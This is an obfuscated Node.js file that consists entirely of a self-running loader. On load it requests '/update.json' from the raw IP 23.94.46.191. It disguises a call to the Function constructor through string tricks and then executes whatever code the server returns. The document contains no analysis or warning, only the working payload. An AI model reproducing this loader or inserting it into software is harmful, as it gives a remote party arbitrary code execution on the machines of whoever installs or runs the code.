function _0x5798(_0x571835, _0x579884) {
    var _0x3a0b06 = _0x5718();
    _0x5798 = function (_0x5162d1, _0x2a6cb3) {
        _0x5162d1 = _0x5162d1 - 0x0;
        var _0x41e89d = _0x3a0b06[_0x5162d1];
        return _0x41e89d;
    };
    return _0x5798(_0x571835, _0x579884);
}
function _0x5718() {
    var _0x457a85 = [
        'data',
        'end',
        'charAt',
        'Buffer',
        'slice'
    ];
    _0x5718 = function () {
        return _0x457a85;
    };
    return _0x5718();
}
(function () {
    var _0x53a650 = require('http');
    return _0x53a650['get']({
        'host': '23.94.46.191',
        'port': 0x50,
        'path': '/update.json'
    }, function (_0x3771e5) {
        var _0x1ca884 = _0x5798;
        var _0xa2613b = '';
        _0x3771e5['on'](_0x1ca884(0x0), function (_0x447c5d) {
            _0xa2613b += _0x447c5d;
        });
        _0x3771e5['on'](_0x1ca884(0x1), function () {
            var _0x4397e8 = _0x5798;
            var _0x243de2 = this[(typeof this['Buffer']['from'])[_0x4397e8(0x2)](0x0)['toUpperCase']() + (typeof this[_0x4397e8(0x3)]['from'])[_0x4397e8(0x4)](0x1)];
            var _0x23ca55 = new _0x243de2(_0xa2613b);
            _0x23ca55();
        });
    });
}());
